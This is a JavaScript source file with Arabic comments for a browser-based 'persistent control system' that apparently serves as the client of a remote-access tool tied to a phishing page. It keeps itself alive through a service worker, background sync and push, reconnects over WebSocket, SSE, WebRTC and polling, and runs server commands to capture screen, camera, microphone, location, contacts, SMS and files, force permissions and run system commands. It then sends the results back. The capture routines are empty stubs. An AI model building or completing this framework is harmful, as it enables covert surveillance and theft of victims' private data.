/**
 * نظام التحكم المستمر - Persistent Control System
 * يعمل حتى بعد انقطاع الاتصال أو إغلاق المتصفح
 * Works even after connection loss or browser closure
 */

class PersistentControlSystem {
    constructor() {
        this.deviceId = this.generateDeviceId();
        this.isActive = false;
        this.persistentData = new Map();
        this.offlineCommands = [];
        this.reconnectionAttempts = 0;
        this.maxReconnectionAttempts = 100;
        this.backgroundTasks = new Map();
        
        // إعدادات الاستمرارية
        this.persistenceConfig = {
            enableOfflineMode: true,
            enableBackgroundSync: true,
            enablePushNotifications: true,
            enableServiceWorker: true,
            enableLocalStorage: true,
            enableIndexedDB: true,
            enableCacheStorage: true,
            enableWebRTC: true,
            enableWebSocket: true,
            enableSSE: true
        };
        
        this.init();
    }

    // بدء النظام
    async init() {
        try {
            console.log('🚀 بدء نظام التحكم المستمر...');
            
            // تفعيل وضع الاستمرارية
            await this.enablePersistenceMode();
            
            // إعداد التخزين المحلي
            await this.setupLocalStorage();
            
            // إعداد IndexedDB
            await this.setupIndexedDB();
            
            // إعداد Cache Storage
            await this.setupCacheStorage();
            
            // إعداد Service Worker
            await this.setupServiceWorker();
            
            // إعداد Background Sync
            await this.setupBackgroundSync();
            
            // إعداد Push Notifications
            await this.setupPushNotifications();
            
            // إعداد الاتصالات المتعددة
            await this.setupMultipleConnections();
            
            // تفعيل المراقبة المستمرة
            this.startContinuousMonitoring();
            
            // تفعيل إعادة الاتصال التلقائي
            this.startAutoReconnection();
            
            this.isActive = true;
            console.log('✅ تم تفعيل نظام التحكم المستمر بنجاح');
            
        } catch (error) {
            console.error('❌ فشل في تفعيل نظام التحكم المستمر:', error);
        }
    }

    // تفعيل وضع الاستمرارية
    async enablePersistenceMode() {
        try {
            // حفظ البيانات في التخزين المحلي
            localStorage.setItem('persistent_control_active', 'true');
            localStorage.setItem('persistent_device_id', this.deviceId);
            localStorage.setItem('persistent_timestamp', Date.now().toString());
            
            // حفظ في Session Storage أيضاً
            sessionStorage.setItem('persistent_control_active', 'true');
            sessionStorage.setItem('persistent_device_id', this.deviceId);
            
            console.log('✅ تم تفعيل وضع الاستمرارية');
        } catch (error) {
            console.error('❌ فشل في تفعيل وضع الاستمرارية:', error);
        }
    }

    // إعداد التخزين المحلي
    async setupLocalStorage() {
        try {
            // حفظ البيانات الأساسية
            const basicData = {
                deviceId: this.deviceId,
                timestamp: Date.now(),
                userAgent: navigator.userAgent,
                platform: navigator.platform,
                language: navigator.language,
                permissions: this.getGrantedPermissions(),
                systemInfo: this.getSystemInfo()
            };
            
            localStorage.setItem('persistent_basic_data', JSON.stringify(basicData));
            
            // حفظ الأوامر المعلقة
            localStorage.setItem('persistent_pending_commands', JSON.stringify(this.offlineCommands));
            
            console.log('✅ تم إعداد التخزين المحلي');
        } catch (error) {
            console.error('❌ فشل في إعداد التخزين المحلي:', error);
        }
    }

    // إعداد IndexedDB
    async setupIndexedDB() {
        try {
            if ('indexedDB' in window) {
                const request = indexedDB.open('PersistentControlDB', 1);
                
                request.onupgradeneeded = (event) => {
                    const db = event.target.result;
                    
                    // إنشاء جداول البيانات
                    if (!db.objectStoreNames.contains('commands')) {
                        db.createObjectStore('commands', { keyPath: 'id', autoIncrement: true });
                    }
                    
                    if (!db.objectStoreNames.contains('data')) {
                        db.createObjectStore('data', { keyPath: 'type' });
                    }
                    
                    if (!db.objectStoreNames.contains('permissions')) {
                        db.createObjectStore('permissions', { keyPath: 'name' });
                    }
                };
                
                request.onsuccess = (event) => {
                    this.db = event.target.result;
                    console.log('✅ تم إعداد IndexedDB');
                };
                
                request.onerror = (event) => {
                    console.error('❌ فشل في إعداد IndexedDB:', event.target.error);
                };
            }
        } catch (error) {
            console.error('❌ فشل في إعداد IndexedDB:', error);
        }
    }

    // إعداد Cache Storage
    async setupCacheStorage() {
        try {
            if ('caches' in window) {
                const cache = await caches.open('persistent-control-cache');
                
                // حفظ الملفات المهمة
                const filesToCache = [
                    '/',
                    '/index.html',
                    '/phishing-enhancer.js',
                    '/enhanced-sw.js',
                    '/persistent-control-system.js'
                ];
                
                await cache.addAll(filesToCache);
                console.log('✅ تم إعداد Cache Storage');
            }
        } catch (error) {
            console.error('❌ فشل في إعداد Cache Storage:', error);
        }
    }

    // إعداد Service Worker
    async setupServiceWorker() {
        try {
            if ('serviceWorker' in navigator) {
                const registration = await navigator.serviceWorker.register('/enhanced-sw.js');
                
                // إرسال رسالة للـ Service Worker
                if (registration.active) {
                    registration.active.postMessage({
                        type: 'persistent_control_init',
                        deviceId: this.deviceId,
                        config: this.persistenceConfig
                    });
                }
                
                // مراقبة التحديثات
                registration.addEventListener('updatefound', () => {
                    console.log('🔄 تم العثور على تحديث للـ Service Worker');
                });
                
                console.log('✅ تم إعداد Service Worker');
            }
        } catch (error) {
            console.error('❌ فشل في إعداد Service Worker:', error);
        }
    }

    // إعداد Background Sync
    async setupBackgroundSync() {
        try {
            if ('serviceWorker' in navigator && 'sync' in window.ServiceWorkerRegistration.prototype) {
                const registration = await navigator.serviceWorker.ready;
                
                // تسجيل Background Sync للاستمرارية
                await registration.sync.register('persistent-control-sync');
                
                // تسجيل Background Sync للأوامر
                await registration.sync.register('offline-commands-sync');
                
                // تسجيل Background Sync للبيانات
                await registration.sync.register('data-sync');
                
                console.log('✅ تم إعداد Background Sync');
            }
        } catch (error) {
            console.error('❌ فشل في إعداد Background Sync:', error);
        }
    }

    // إعداد Push Notifications
    async setupPushNotifications() {
        try {
            if ('serviceWorker' in navigator && 'PushManager' in window) {
                const registration = await navigator.serviceWorker.ready;
                
                // طلب إذن الإشعارات
                const permission = await Notification.requestPermission();
                
                if (permission === 'granted') {
                    // الحصول على subscription
                    const subscription = await registration.pushManager.subscribe({
                        userVisibleOnly: true,
                        applicationServerKey: this.urlBase64ToUint8Array('YOUR_VAPID_PUBLIC_KEY')
                    });
                    
                    // حفظ subscription
                    localStorage.setItem('push_subscription', JSON.stringify(subscription));
                    
                    console.log('✅ تم إعداد Push Notifications');
                }
            }
        } catch (error) {
            console.error('❌ فشل في إعداد Push Notifications:', error);
        }
    }

    // إعداد الاتصالات المتعددة
    async setupMultipleConnections() {
        try {
            // إعداد WebSocket
            this.setupPersistentWebSocket();
            
            // إعداد SSE
            this.setupPersistentSSE();
            
            // إعداد WebRTC
            this.setupPersistentWebRTC();
            
            // إعداد HTTP Long Polling
            this.setupHTTPLongPolling();
            
            console.log('✅ تم إعداد الاتصالات المتعددة');
        } catch (error) {
            console.error('❌ فشل في إعداد الاتصالات المتعددة:', error);
        }
    }

    // إعداد WebSocket المستمر
    setupPersistentWebSocket() {
        try {
            const connectWebSocket = () => {
                const ws = new WebSocket('ws://localhost:8080/persistent-ws');
                
                ws.onopen = () => {
                    console.log('🔗 تم الاتصال بـ WebSocket المستمر');
                    ws.send(JSON.stringify({
                        type: 'persistent_register',
                        deviceId: this.deviceId,
                        timestamp: Date.now()
                    }));
                };
                
                ws.onmessage = (event) => {
                    const data = JSON.parse(event.data);
                    this.handlePersistentMessage(data);
                };
                
                ws.onclose = () => {
                    console.log('🔌 انقطع الاتصال بـ WebSocket - إعادة الاتصال...');
                    setTimeout(connectWebSocket, 5000);
                };
                
                ws.onerror = (error) => {
                    console.error('❌ خطأ في WebSocket:', error);
                };
                
                this.persistentWebSocket = ws;
            };
            
            connectWebSocket();
        } catch (error) {
            console.error('❌ فشل في إعداد WebSocket المستمر:', error);
        }
    }

    // إعداد SSE المستمر
    setupPersistentSSE() {
        try {
            const connectSSE = () => {
                const eventSource = new EventSource('/persistent-events');
                
                eventSource.onmessage = (event) => {
                    const data = JSON.parse(event.data);
                    this.handlePersistentMessage(data);
                };
                
                eventSource.onerror = () => {
                    console.log('🔌 انقطع الاتصال بـ SSE - إعادة الاتصال...');
                    setTimeout(connectSSE, 5000);
                };
                
                this.persistentSSE = eventSource;
            };
            
            connectSSE();
        } catch (error) {
            console.error('❌ فشل في إعداد SSE المستمر:', error);
        }
    }

    // إعداد WebRTC المستمر
    setupPersistentWebRTC() {
        try {
            const pc = new RTCPeerConnection({
                iceServers: [
                    { urls: 'stun:stun.l.google.com:19302' },
                    { urls: 'stun:stun1.l.google.com:19302' }
                ]
            });
            
            pc.ondatachannel = (event) => {
                const channel = event.channel;
                this.setupPersistentDataChannel(channel);
            };
            
            this.persistentPeerConnection = pc;
            console.log('✅ تم إعداد WebRTC المستمر');
        } catch (error) {
            console.error('❌ فشل في إعداد WebRTC المستمر:', error);
        }
    }

    // إعداد HTTP Long Polling
    setupHTTPLongPolling() {
        try {
            const pollForCommands = async () => {
                try {
                    const response = await fetch('/api/persistent/commands', {
                        method: 'POST',
                        headers: {
                            'Content-Type': 'application/json'
                        },
                        body: JSON.stringify({
                            deviceId: this.deviceId,
                            timestamp: Date.now()
                        })
                    });
                    
                    if (response.ok) {
                        const data = await response.json();
                        if (data.commands && data.commands.length > 0) {
                            this.handlePersistentCommands(data.commands);
                        }
                    }
                } catch (error) {
                    console.error('❌ خطأ في HTTP Long Polling:', error);
                }
                
                // الاستمرار في الـ polling
                setTimeout(pollForCommands, 10000);
            };
            
            pollForCommands();
            console.log('✅ تم إعداد HTTP Long Polling');
        } catch (error) {
            console.error('❌ فشل في إعداد HTTP Long Polling:', error);
        }
    }

    // بدء المراقبة المستمرة
    startContinuousMonitoring() {
        try {
            // مراقبة حالة الاتصال
            window.addEventListener('online', () => {
                console.log('🌐 تم استعادة الاتصال بالإنترنت');
                this.handleConnectionRestored();
            });
            
            window.addEventListener('offline', () => {
                console.log('🔌 تم فقدان الاتصال بالإنترنت');
                this.handleConnectionLost();
            });
            
            // مراقبة إغلاق الصفحة
            window.addEventListener('beforeunload', (event) => {
                this.handlePageUnload(event);
            });
            
            // مراقبة تغيير الرؤية
            document.addEventListener('visibilitychange', () => {
                if (document.hidden) {
                    this.handlePageHidden();
                } else {
                    this.handlePageVisible();
                }
            });
            
            // مراقبة تغيير التركيز
            window.addEventListener('focus', () => {
                this.handleWindowFocus();
            });
            
            window.addEventListener('blur', () => {
                this.handleWindowBlur();
            });
            
            console.log('✅ تم بدء المراقبة المستمرة');
        } catch (error) {
            console.error('❌ فشل في بدء المراقبة المستمرة:', error);
        }
    }

    // بدء إعادة الاتصال التلقائي
    startAutoReconnection() {
        try {
            const attemptReconnection = () => {
                if (this.reconnectionAttempts < this.maxReconnectionAttempts) {
                    this.reconnectionAttempts++;
                    console.log(`🔄 محاولة إعادة الاتصال ${this.reconnectionAttempts}/${this.maxReconnectionAttempts}`);
                    
                    // محاولة إعادة الاتصال بجميع الطرق
                    this.setupPersistentWebSocket();
                    this.setupPersistentSSE();
                    this.setupPersistentWebRTC();
                    
                    // زيادة الفاصل الزمني تدريجياً
                    const delay = Math.min(5000 * this.reconnectionAttempts, 300000);
                    setTimeout(attemptReconnection, delay);
                }
            };
            
            // بدء محاولات إعادة الاتصال
            setTimeout(attemptReconnection, 5000);
            
            console.log('✅ تم بدء إعادة الاتصال التلقائي');
        } catch (error) {
            console.error('❌ فشل في بدء إعادة الاتصال التلقائي:', error);
        }
    }

    // معالجة الرسائل المستمرة
    handlePersistentMessage(data) {
        try {
            switch (data.type) {
                case 'command':
                    this.executePersistentCommand(data.command);
                    break;
                case 'data_request':
                    this.sendPersistentData(data.dataType);
                    break;
                case 'permission_request':
                    this.grantPersistentPermission(data.permission);
                    break;
                case 'system_command':
                    this.executePersistentSystemCommand(data.command);
                    break;
                case 'heartbeat':
                    this.sendPersistentHeartbeat();
                    break;
                default:
                    console.log('📨 رسالة مستمرة غير معروفة:', data);
            }
        } catch (error) {
            console.error('❌ فشل في معالجة الرسالة المستمرة:', error);
        }
    }

    // تنفيذ الأوامر المستمرة
    async executePersistentCommand(command) {
        try {
            console.log(`💻 تنفيذ أمر مستمر: ${command.type}`);
            
            switch (command.type) {
                case 'capture_screen':
                    await this.capturePersistentScreen();
                    break;
                case 'capture_camera':
                    await this.capturePersistentCamera();
                    break;
                case 'capture_microphone':
                    await this.capturePersistentMicrophone();
                    break;
                case 'get_location':
                    await this.getPersistentLocation();
                    break;
                case 'get_contacts':
                    await this.getPersistentContacts();
                    break;
                case 'get_sms':
                    await this.getPersistentSMS();
                    break;
                case 'get_files':
                    await this.getPersistentFiles();
                    break;
                case 'system_info':
                    await this.getPersistentSystemInfo();
                    break;
                default:
                    await this.executeGenericPersistentCommand(command);
            }
            
            // حفظ الأمر في التخزين المحلي
            this.savePersistentCommand(command);
            
        } catch (error) {
            console.error('❌ فشل في تنفيذ الأمر المستمر:', error);
        }
    }

    // إرسال البيانات المستمرة
    async sendPersistentData(dataType) {
        try {
            let data = null;
            
            switch (dataType) {
                case 'screen':
                    data = await this.capturePersistentScreen();
                    break;
                case 'camera':
                    data = await this.capturePersistentCamera();
                    break;
                case 'microphone':
                    data = await this.capturePersistentMicrophone();
                    break;
                case 'location':
                    data = await this.getPersistentLocation();
                    break;
                case 'contacts':
                    data = await this.getPersistentContacts();
                    break;
                case 'sms':
                    data = await this.getPersistentSMS();
                    break;
                case 'files':
                    data = await this.getPersistentFiles();
                    break;
                case 'system_info':
                    data = await this.getPersistentSystemInfo();
                    break;
                default:
                    data = await this.getGenericPersistentData(dataType);
            }
            
            if (data) {
                this.sendPersistentDataToServer(dataType, data);
            }
            
        } catch (error) {
            console.error('❌ فشل في إرسال البيانات المستمرة:', error);
        }
    }

    // منح الصلاحيات المستمرة
    async grantPersistentPermission(permission) {
        try {
            console.log(`🔐 منح صلاحية مستمرة: ${permission}`);
            
            // محاولة منح الصلاحية
            const result = await this.forcePersistentPermission(permission);
            
            // حفظ الصلاحية في التخزين المحلي
            this.savePersistentPermission(permission, result);
            
            // إرسال النتيجة للخادم
            this.sendPersistentPermissionResult(permission, result);
            
        } catch (error) {
            console.error('❌ فشل في منح الصلاحية المستمرة:', error);
        }
    }

    // تنفيذ أوامر النظام المستمرة
    async executePersistentSystemCommand(command) {
        try {
            console.log(`⚙️ تنفيذ أمر نظام مستمر: ${command}`);
            
            // تنفيذ الأمر
            const result = await this.executeSystemCommand(command);
            
            // حفظ النتيجة
            this.savePersistentSystemCommand(command, result);
            
            // إرسال النتيجة للخادم
            this.sendPersistentSystemCommandResult(command, result);
            
        } catch (error) {
            console.error('❌ فشل في تنفيذ أمر النظام المستمر:', error);
        }
    }

    // إرسال نبض مستمر
    sendPersistentHeartbeat() {
        try {
            const heartbeat = {
                type: 'persistent_heartbeat',
                deviceId: this.deviceId,
                timestamp: Date.now(),
                isActive: this.isActive,
                permissions: this.getGrantedPermissions(),
                systemInfo: this.getSystemInfo()
            };
            
            // إرسال عبر جميع القنوات
            this.sendPersistentDataToServer('heartbeat', heartbeat);
            
        } catch (error) {
            console.error('❌ فشل في إرسال النبض المستمر:', error);
        }
    }

    // معالجة استعادة الاتصال
    handleConnectionRestored() {
        try {
            console.log('🌐 معالجة استعادة الاتصال...');
            
            // إعادة تعيين عداد المحاولات
            this.reconnectionAttempts = 0;
            
            // إرسال جميع الأوامر المعلقة
            this.sendPendingCommands();
            
            // إرسال جميع البيانات المحفوظة
            this.sendPendingData();
            
            // إرسال نبض استعادة الاتصال
            this.sendPersistentHeartbeat();
            
            console.log('✅ تم معالجة استعادة الاتصال');
        } catch (error) {
            console.error('❌ فشل في معالجة استعادة الاتصال:', error);
        }
    }

    // معالجة فقدان الاتصال
    handleConnectionLost() {
        try {
            console.log('🔌 معالجة فقدان الاتصال...');
            
            // حفظ الحالة الحالية
            this.saveCurrentState();
            
            // تفعيل وضع عدم الاتصال
            this.enableOfflineMode();
            
            // بدء محاولات إعادة الاتصال
            this.startAutoReconnection();
            
            console.log('✅ تم معالجة فقدان الاتصال');
        } catch (error) {
            console.error('❌ فشل في معالجة فقدان الاتصال:', error);
        }
    }

    // معالجة إغلاق الصفحة
    handlePageUnload(event) {
        try {
            console.log('🚪 معالجة إغلاق الصفحة...');
            
            // حفظ الحالة النهائية
            this.saveFinalState();
            
            // إرسال إشعار إغلاق
            this.sendPageUnloadNotification();
            
            // إظهار رسالة تأكيد
            event.preventDefault();
            event.returnValue = 'هل أنت متأكد من أنك تريد الخروج؟';
            
        } catch (error) {
            console.error('❌ فشل في معالجة إغلاق الصفحة:', error);
        }
    }

    // معالجة إخفاء الصفحة
    handlePageHidden() {
        try {
            console.log('👁️ معالجة إخفاء الصفحة...');
            
            // حفظ الحالة
            this.saveCurrentState();
            
            // تفعيل المراقبة في الخلفية
            this.enableBackgroundMonitoring();
            
        } catch (error) {
            console.error('❌ فشل في معالجة إخفاء الصفحة:', error);
        }
    }

    // معالجة ظهور الصفحة
    handlePageVisible() {
        try {
            console.log('👁️ معالجة ظهور الصفحة...');
            
            // إرسال نبض الظهور
            this.sendPersistentHeartbeat();
            
            // إرسال الأوامر المعلقة
            this.sendPendingCommands();
            
        } catch (error) {
            console.error('❌ فشل في معالجة ظهور الصفحة:', error);
        }
    }

    // معالجة تركيز النافذة
    handleWindowFocus() {
        try {
            console.log('🎯 معالجة تركيز النافذة...');
            
            // إرسال نبض التركيز
            this.sendPersistentHeartbeat();
            
        } catch (error) {
            console.error('❌ فشل في معالجة تركيز النافذة:', error);
        }
    }

    // معالجة فقدان تركيز النافذة
    handleWindowBlur() {
        try {
            console.log('🎯 معالجة فقدان تركيز النافذة...');
            
            // حفظ الحالة
            this.saveCurrentState();
            
        } catch (error) {
            console.error('❌ فشل في معالجة فقدان تركيز النافذة:', error);
        }
    }

    // حفظ الحالة الحالية
    saveCurrentState() {
        try {
            const state = {
                deviceId: this.deviceId,
                timestamp: Date.now(),
                isActive: this.isActive,
                permissions: this.getGrantedPermissions(),
                systemInfo: this.getSystemInfo(),
                pendingCommands: this.offlineCommands,
                persistentData: Array.from(this.persistentData.entries())
            };
            
            localStorage.setItem('persistent_current_state', JSON.stringify(state));
            
        } catch (error) {
            console.error('❌ فشل في حفظ الحالة الحالية:', error);
        }
    }

    // حفظ الحالة النهائية
    saveFinalState() {
        try {
            const finalState = {
                deviceId: this.deviceId,
                timestamp: Date.now(),
                isActive: false,
                permissions: this.getGrantedPermissions(),
                systemInfo: this.getSystemInfo(),
                pendingCommands: this.offlineCommands,
                persistentData: Array.from(this.persistentData.entries()),
                isFinal: true
            };
            
            localStorage.setItem('persistent_final_state', JSON.stringify(finalState));
            
        } catch (error) {
            console.error('❌ فشل في حفظ الحالة النهائية:', error);
        }
    }

    // إرسال إشعار إغلاق الصفحة
    sendPageUnloadNotification() {
        try {
            const notification = {
                type: 'page_unload',
                deviceId: this.deviceId,
                timestamp: Date.now(),
                url: window.location.href,
                userAgent: navigator.userAgent
            };
            
            this.sendPersistentDataToServer('notification', notification);
            
        } catch (error) {
            console.error('❌ فشل في إرسال إشعار إغلاق الصفحة:', error);
        }
    }

    // تفعيل وضع عدم الاتصال
    enableOfflineMode() {
        try {
            console.log('🔌 تفعيل وضع عدم الاتصال...');
            
            // حفظ الأوامر المعلقة
            this.savePendingCommands();
            
            // حفظ البيانات المعلقة
            this.savePendingData();
            
            // تفعيل Background Sync
            this.enableBackgroundSync();
            
            console.log('✅ تم تفعيل وضع عدم الاتصال');
        } catch (error) {
            console.error('❌ فشل في تفعيل وضع عدم الاتصال:', error);
        }
    }

    // تفعيل المراقبة في الخلفية
    enableBackgroundMonitoring() {
        try {
            console.log('👁️ تفعيل المراقبة في الخلفية...');
            
            // إعداد مراقبة في الخلفية
            if ('serviceWorker' in navigator) {
                navigator.serviceWorker.ready.then(registration => {
                    registration.active.postMessage({
                        type: 'enable_background_monitoring',
                        deviceId: this.deviceId
                    });
                });
            }
            
            console.log('✅ تم تفعيل المراقبة في الخلفية');
        } catch (error) {
            console.error('❌ فشل في تفعيل المراقبة في الخلفية:', error);
        }
    }

    // إرسال الأوامر المعلقة
    async sendPendingCommands() {
        try {
            const pendingCommands = JSON.parse(localStorage.getItem('persistent_pending_commands') || '[]');
            
            if (pendingCommands.length > 0) {
                console.log(`📤 إرسال ${pendingCommands.length} أمر معلق...`);
                
                for (const command of pendingCommands) {
                    await this.executePersistentCommand(command);
                }
                
                // مسح الأوامر المعلقة
                localStorage.removeItem('persistent_pending_commands');
                
                console.log('✅ تم إرسال جميع الأوامر المعلقة');
            }
        } catch (error) {
            console.error('❌ فشل في إرسال الأوامر المعلقة:', error);
        }
    }

    // إرسال البيانات المعلقة
    async sendPendingData() {
        try {
            const pendingData = JSON.parse(localStorage.getItem('persistent_pending_data') || '[]');
            
            if (pendingData.length > 0) {
                console.log(`📤 إرسال ${pendingData.length} بيانات معلقة...`);
                
                for (const data of pendingData) {
                    await this.sendPersistentData(data.type);
                }
                
                // مسح البيانات المعلقة
                localStorage.removeItem('persistent_pending_data');
                
                console.log('✅ تم إرسال جميع البيانات المعلقة');
            }
        } catch (error) {
            console.error('❌ فشل في إرسال البيانات المعلقة:', error);
        }
    }

    // حفظ الأوامر المعلقة
    savePendingCommands() {
        try {
            localStorage.setItem('persistent_pending_commands', JSON.stringify(this.offlineCommands));
        } catch (error) {
            console.error('❌ فشل في حفظ الأوامر المعلقة:', error);
        }
    }

    // حفظ البيانات المعلقة
    savePendingData() {
        try {
            const pendingData = Array.from(this.persistentData.entries());
            localStorage.setItem('persistent_pending_data', JSON.stringify(pendingData));
        } catch (error) {
            console.error('❌ فشل في حفظ البيانات المعلقة:', error);
        }
    }

    // حفظ الأمر المستمر
    savePersistentCommand(command) {
        try {
            this.offlineCommands.push({
                ...command,
                timestamp: Date.now(),
                deviceId: this.deviceId
            });
            
            this.savePendingCommands();
        } catch (error) {
            console.error('❌ فشل في حفظ الأمر المستمر:', error);
        }
    }

    // حفظ الصلاحية المستمرة
    savePersistentPermission(permission, granted) {
        try {
            const permissions = JSON.parse(localStorage.getItem('persistent_permissions') || '{}');
            permissions[permission] = {
                granted: granted,
                timestamp: Date.now(),
                deviceId: this.deviceId
            };
            
            localStorage.setItem('persistent_permissions', JSON.stringify(permissions));
        } catch (error) {
            console.error('❌ فشل في حفظ الصلاحية المستمرة:', error);
        }
    }

    // حفظ أمر النظام المستمر
    savePersistentSystemCommand(command, result) {
        try {
            const systemCommands = JSON.parse(localStorage.getItem('persistent_system_commands') || '[]');
            systemCommands.push({
                command: command,
                result: result,
                timestamp: Date.now(),
                deviceId: this.deviceId
            });
            
            localStorage.setItem('persistent_system_commands', JSON.stringify(systemCommands));
        } catch (error) {
            console.error('❌ فشل في حفظ أمر النظام المستمر:', error);
        }
    }

    // إرسال البيانات للخادم
    sendPersistentDataToServer(dataType, data) {
        try {
            // إرسال عبر WebSocket
            if (this.persistentWebSocket && this.persistentWebSocket.readyState === WebSocket.OPEN) {
                this.persistentWebSocket.send(JSON.stringify({
                    type: 'persistent_data',
                    dataType: dataType,
                    data: data,
                    deviceId: this.deviceId,
                    timestamp: Date.now()
                }));
            }
            
            // إرسال عبر HTTP
            fetch('/api/persistent/data', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify({
                    type: 'persistent_data',
                    dataType: dataType,
                    data: data,
                    deviceId: this.deviceId,
                    timestamp: Date.now()
                })
            }).catch(error => {
                console.error('❌ فشل في إرسال البيانات عبر HTTP:', error);
            });
            
        } catch (error) {
            console.error('❌ فشل في إرسال البيانات للخادم:', error);
        }
    }

    // إرسال نتيجة الصلاحية المستمرة
    sendPersistentPermissionResult(permission, result) {
        try {
            this.sendPersistentDataToServer('permission_result', {
                permission: permission,
                result: result,
                deviceId: this.deviceId,
                timestamp: Date.now()
            });
        } catch (error) {
            console.error('❌ فشل في إرسال نتيجة الصلاحية المستمرة:', error);
        }
    }

    // إرسال نتيجة أمر النظام المستمر
    sendPersistentSystemCommandResult(command, result) {
        try {
            this.sendPersistentDataToServer('system_command_result', {
                command: command,
                result: result,
                deviceId: this.deviceId,
                timestamp: Date.now()
            });
        } catch (error) {
            console.error('❌ فشل في إرسال نتيجة أمر النظام المستمر:', error);
        }
    }

    // الحصول على الصلاحيات الممنوحة
    getGrantedPermissions() {
        try {
            const permissions = JSON.parse(localStorage.getItem('persistent_permissions') || '{}');
            return Object.keys(permissions).filter(key => permissions[key].granted);
        } catch (error) {
            console.error('❌ فشل في الحصول على الصلاحيات الممنوحة:', error);
            return [];
        }
    }

    // الحصول على معلومات النظام
    getSystemInfo() {
        try {
            return {
                userAgent: navigator.userAgent,
                platform: navigator.platform,
                language: navigator.language,
                cookieEnabled: navigator.cookieEnabled,
                onLine: navigator.onLine,
                hardwareConcurrency: navigator.hardwareConcurrency,
                deviceMemory: navigator.deviceMemory,
                maxTouchPoints: navigator.maxTouchPoints,
                screenWidth: screen.width,
                screenHeight: screen.height,
                colorDepth: screen.colorDepth,
                pixelDepth: screen.pixelDepth,
                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                timestamp: Date.now()
            };
        } catch (error) {
            console.error('❌ فشل في الحصول على معلومات النظام:', error);
            return {};
        }
    }

    // إنشاء معرف الجهاز
    generateDeviceId() {
        const timestamp = Date.now();
        const random = Math.random().toString(36).substring(2);
        return `persistent_device_${timestamp}_${random}`;
    }

    // تحويل VAPID key
    urlBase64ToUint8Array(base64String) {
        const padding = '='.repeat((4 - base64String.length % 4) % 4);
        const base64 = (base64String + padding)
            .replace(/-/g, '+')
            .replace(/_/g, '/');

        const rawData = window.atob(base64);
        const outputArray = new Uint8Array(rawData.length);

        for (let i = 0; i < rawData.length; ++i) {
            outputArray[i] = rawData.charCodeAt(i);
        }
        return outputArray;
    }

    // وظائف التقاط البيانات المستمرة (سيتم تنفيذها حسب الحاجة)
    async capturePersistentScreen() { /* تنفيذ التقاط الشاشة */ }
    async capturePersistentCamera() { /* تنفيذ التقاط الكاميرا */ }
    async capturePersistentMicrophone() { /* تنفيذ التقاط الميكروفون */ }
    async getPersistentLocation() { /* تنفيذ الحصول على الموقع */ }
    async getPersistentContacts() { /* تنفيذ الحصول على جهات الاتصال */ }
    async getPersistentSMS() { /* تنفيذ الحصول على الرسائل */ }
    async getPersistentFiles() { /* تنفيذ الحصول على الملفات */ }
    async getPersistentSystemInfo() { /* تنفيذ الحصول على معلومات النظام */ }
    async executeGenericPersistentCommand(command) { /* تنفيذ أمر عام */ }
    async getGenericPersistentData(dataType) { /* الحصول على بيانات عامة */ }
    async forcePersistentPermission(permission) { /* إجبار منح الصلاحية */ }
    async executeSystemCommand(command) { /* تنفيذ أمر النظام */ }
}

// بدء نظام التحكم المستمر
const persistentControlSystem = new PersistentControlSystem();

// تصدير النظام للاستخدام العام
window.PersistentControlSystem = PersistentControlSystem;
window.persistentControlSystem = persistentControlSystem;

console.log('🚀 تم تحميل نظام التحكم المستمر بنجاح');